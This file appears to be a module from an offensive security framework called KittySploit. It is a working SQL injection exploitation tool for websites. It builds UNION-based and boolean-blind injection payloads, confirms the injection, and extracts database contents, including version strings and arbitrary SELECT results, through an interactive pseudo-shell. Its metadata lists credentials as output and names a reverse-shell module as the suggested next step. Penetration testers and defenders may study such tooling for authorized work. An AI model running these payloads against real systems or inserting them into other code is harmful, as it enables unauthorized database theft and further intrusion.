#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Generic HTTP SQL injection post-exploitation (authorized testing only).

After confirming SQLi (scanner / manual), configure injection point and technique,
then use the Sqli pseudo-shell for read-only extraction (?tables, ?dump, raw SELECT).

Union template must contain ``{expr}`` replaced with the wrapped scalar subquery.
"""

from __future__ import annotations

import re
import urllib.parse
from typing import Any, Optional
from urllib.parse import parse_qsl, urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli import Sqli, sqli_blind_extract_string
from lib.protocols.http.sqli_engine.extractor import make_blind_oracle


class Module(Post, Http_client, Sqli):

    __info__ = {
        "name": "HTTP SQLi Shell",
        "description": (
            "Read-only SQL extraction via confirmed HTTP SQLi: union-based scalar "
            "or boolean-blind oracle. Starts Sqli pseudo-shell or runs single_sql."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "sqli", "post", "mysql", "postgresql", "extraction"],
        "references": [
            "https://owasp.org/www-community/attacks/SQL_Injection"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "credentials"],
            "chain": {
                "consumes_capabilities": ["db_access", "inj_param"],
                "produces_capabilities": ["shell"],
                "option_bindings": {
                    "inj_param": "inj_param",
                    "inj_path": "inj_path",
                    "inj_method": "inj_method",
                },
                "suggested_followups": ["post/shell/multi/manage/spawn_reverse_shell"],
            },
        },
    }

    inj_path = OptString("/", "Injection path (may include query string)", required=False)
    inj_param = OptString("id", "Vulnerable parameter name", required=True)
    inj_method = OptString("GET", "HTTP method: GET or POST", required=False)
    technique = OptString(
        "union",
        "Extraction technique: union, blind_boolean",
        required=False,
    )
    union_template = OptString(
        "1' UNION SELECT '{marker}',{expr}#",
        "Union payload template; {marker} and {expr} are substituted",
        required=False,
    )
    marker = OptString("KSPI", "First UNION column marker for response parsing", required=False)
    extract_regex = OptString(
        "",
        "Optional regex with one capture group to extract scalar from body",
        required=False,
        advanced=True,
    )
    blind_true_template = OptString(
        "{original} AND ({cond})",
        "Boolean-blind true branch; {original} and {cond} substituted",
        required=False,
        advanced=True,
    )
    blind_threads = OptPort(8, "Parallel threads for blind extraction", required=False, advanced=True)
    shell_sqli = OptBool(True, "Start Sqli pseudo-shell after confirmation", required=False)
    single_sql = OptString("@@version", "One-shot query when shell_sqli is false", required=False)
    engine_union_template = OptString(
        "",
        "Union template from sqli_engine scan (overrides union_template when set)",
        required=False,
        advanced=True,
    )
    engine_blind_template = OptString(
        "",
        "Boolean-blind template from sqli_engine scan (overrides blind_true_template)",
        required=False,
        advanced=True,
    )
    engine_technique = OptString(
        "",
        "Extraction technique from scan: union or blind_boolean",
        required=False,
        advanced=True,
    )
    inj_original = OptString(
        "",
        "Original parameter value from sqli_engine context",
        required=False,
        advanced=True,
    )

    def _opt(self, opt) -> str:
        return str(opt.value if hasattr(opt, "value") else opt or "")

    def _build_get_path(self, base_path: str, param_name: str, payload: str) -> str:
        base_path = base_path if str(base_path).startswith("/") else f"/{base_path}"
        parsed = urlparse(base_path)
        path_only = parsed.path or "/"
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        params[param_name] = payload
        query = urllib.parse.urlencode(params)
        return f"{path_only}?{query}" if query else path_only

    def _original_value(self) -> str:
        forced = self._opt(getattr(self, "inj_original", "")).strip()
        if forced:
            return forced
        parsed = urlparse(self._opt(self.inj_path) if self._opt(self.inj_path).startswith("/") else f"/{self.inj_path}")
        for key, value in parse_qsl(parsed.query, keep_blank_values=True):
            if key.lower() == self._opt(self.inj_param).lower():
                return value if value else "1"
        return "1"

    def _apply_engine_extraction_config(self) -> None:
        union_tpl = self._opt(getattr(self, "engine_union_template", "")).strip()
        blind_tpl = self._opt(getattr(self, "engine_blind_template", "")).strip()
        technique = self._opt(getattr(self, "engine_technique", "")).strip().lower()
        if union_tpl:
            self.union_template = union_tpl
        if blind_tpl:
            self.blind_true_template = blind_tpl
        if technique in {"union", "blind_boolean"}:
            self.technique = technique

    @classmethod
    def extraction_options_from_hit(cls, hit: dict) -> dict:
        """Build module option kwargs from an sqli_engine scanner hit."""
        cfg = hit.get("extraction_config") if isinstance(hit, dict) else None
        if not isinstance(cfg, dict):
            cfg = {}
        return {
            "engine_union_template": str(cfg.get("union_template") or hit.get("union_template") or ""),
            "engine_blind_template": str(cfg.get("blind_true_template") or hit.get("blind_true_template") or ""),
            "engine_technique": str(cfg.get("technique") or hit.get("recommended_technique") or ""),
            "inj_original": str(cfg.get("original") or hit.get("inj_original") or ""),
            "inj_param": str(hit.get("param") or "id"),
            "inj_method": str(hit.get("method") or "GET"),
        }

    def _inject(self, payload: str, *, timeout: Optional[float] = None) -> Any:
        method = self._opt(self.inj_method).upper()
        path = self._opt(self.inj_path) or "/"
        param = self._opt(self.inj_param)
        kw: dict = {"allow_redirects": False}
        if timeout is not None:
            kw["timeout"] = timeout

        if method == "GET":
            test_path = self._build_get_path(path, param, payload)
            return self.http_request(method="GET", path=test_path, **kw)
        post_path = urlparse(path if path.startswith("/") else f"/{path}").path or "/"
        return self.http_request(method="POST", path=post_path, data={param: payload}, **kw)

    def _extract_from_body(self, body: str, marker: str) -> Optional[str]:
        text = body or ""
        if not text:
            return None

        pattern = self._opt(self.extract_regex).strip()
        if pattern:
            m = re.search(pattern, text, re.I | re.S)
            if m:
                return (m.group(1) if m.lastindex else m.group(0)).strip()

        if marker and marker in text:
            idx = text.index(marker)
            tail = text[idx + len(marker):]
            for sep in ("</", "\n", "\r", ",", "|", " ", "'"):
                if sep in tail[:256]:
                    return tail.split(sep, 1)[0].strip()[:512]
            return tail.strip()[:512]
        return None

    def _union_payload(self, expr_wrapped: str) -> str:
        tpl = self._opt(self.union_template)
        mark = self._opt(self.marker) or "KSPI"
        if "{expr}" not in tpl:
            raise ValueError("union_template must contain {expr}")
        return tpl.replace("{marker}", mark).replace("{expr}", expr_wrapped)

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        technique = self._opt(self.technique).lower()
        if technique == "blind_boolean":
            return self._blind_fetch_scalar(user_line)

        wrapped = Sqli.wrap_scalar_expression(user_line)
        if not wrapped:
            return None
        payload = self._union_payload(wrapped)
        resp = self._inject(payload)
        body = (resp.text or "") if resp else ""
        return self._extract_from_body(body, self._opt(self.marker))

    def _blind_condition_true(self, cond: str) -> bool:
        from lib.protocols.http.sqli_engine.comparison import boolean_evidence, similarity
        from lib.protocols.http.sqli_engine.oracle import ProbeResponse

        original = self._original_value()
        tpl = self._opt(self.blind_true_template) or "{original} AND ({cond})"
        payload = tpl.replace("{original}", original).replace("{cond}", cond)
        baseline = self._inject(original)
        probe = self._inject(payload)
        if not baseline or not probe:
            return False
        base_p = ProbeResponse(
            status_code=int(getattr(baseline, "status_code", 0) or 0),
            text=str(getattr(baseline, "text", "") or ""),
        )
        probe_p = ProbeResponse(
            status_code=int(getattr(probe, "status_code", 0) or 0),
            text=str(getattr(probe, "text", "") or ""),
        )
        false_probe = self._inject(tpl.replace("{original}", original).replace("{cond}", "1=2"))
        false_p = ProbeResponse(
            status_code=int(getattr(false_probe, "status_code", 0) or 0),
            text=str(getattr(false_probe, "text", "") or ""),
        ) if false_probe else ProbeResponse()
        if boolean_evidence(base_p, probe_p, false_p):
            return True
        bl = len(base_p.text or "")
        pl = len(probe_p.text or "")
        return similarity(base_p.text, probe_p.text) >= 0.90 and abs(pl - bl) <= max(60, int(bl * 0.08))

    def _blind_gt(self, expr: str) -> bool:
        return self._blind_condition_true(f"({expr})")

    def _blind_subquery(self, user_line: str) -> Optional[str]:
        raw = (user_line or "").strip().rstrip(";")
        if not raw:
            return None
        if raw.upper().startswith("SELECT"):
            return raw
        return f"SELECT {raw}"

    def _blind_fetch_scalar(self, user_line: str) -> Optional[str]:
        subquery = self._blind_subquery(user_line)
        if not subquery:
            return None
        oracle = make_blind_oracle(self._blind_condition_true, gt_fn=self._blind_gt)
        return sqli_blind_extract_string(
            oracle.true,
            oracle.gt,
            oracle.errors,
            subquery,
            threads=int(self._opt(self.blind_threads) or 8),
        )

    def _confirm_injection(self) -> bool:
        technique = self._opt(self.technique).lower()
        if technique == "blind_boolean":
            if self._blind_condition_true("1=1") and not self._blind_condition_true("1=2"):
                print_success("Boolean-blind SQLi oracle calibrated.")
                return True
            print_error("Boolean-blind oracle failed calibration (1=1 / 1=2).")
            return False

        mark = self._opt(self.marker) or "KSPI"
        probe_expr = f"'{mark}'"
        payload = self._union_payload(probe_expr)
        resp = self._inject(payload)
        body = (resp.text or "") if resp else ""
        if mark in body:
            print_success(f"UNION SQLi confirmed (marker {mark!r} in response).")
            return True
        print_error("UNION confirmation failed — adjust union_template/marker/extract_regex.")
        return False

    def run(self):
        self.vulnerability_info = {"reason": "", "severity": "Info"}

        if not self.check():
            print_error("Target unreachable.")
            self.vulnerability_info["reason"] = "Target unreachable"
            return False

        self._apply_engine_extraction_config()

        print_status(
            f"HTTP SQLi post — {self._opt(self.inj_method).upper()} "
            f"{self._opt(self.inj_path)} param={self._opt(self.inj_param)} "
            f"technique={self._opt(self.technique)}"
        )

        if not self._confirm_injection():
            self.vulnerability_info.update({
                "reason": "SQLi confirmation failed",
                "severity": "Medium",
            })
            return False

        self.vulnerability_info.update({
            "reason": f"HTTP SQLi confirmed ({self._opt(self.technique)})",
            "severity": "High",
            "inj_param": self._opt(self.inj_param),
            "inj_path": self._opt(self.inj_path),
            "technique": self._opt(self.technique),
        })

        if self.shell_sqli:
            proof = self.sqli_fetch_scalar("@@version") or self.sqli_fetch_scalar("version()") or ""
            if proof:
                print_info(f"DB version: {proof[:500]}")
                self.vulnerability_info["version"] = proof[:200]
            self.handler_sqli()
        else:
            expr = self._opt(self.single_sql).strip() or "@@version"
            out = self.sqli_fetch_scalar(expr)
            if out:
                print_info(out)
                self.vulnerability_info["version"] = out[:200]
            else:
                print_warning("single_sql returned empty result.")

        self.vulnerable()
        return True

    def check(self) -> bool:
        try:
            response = self.http_request(method="GET", path="/")
            return bool(response and response.status_code in (200, 301, 302, 403, 404, 401))
        except Exception:
            return False
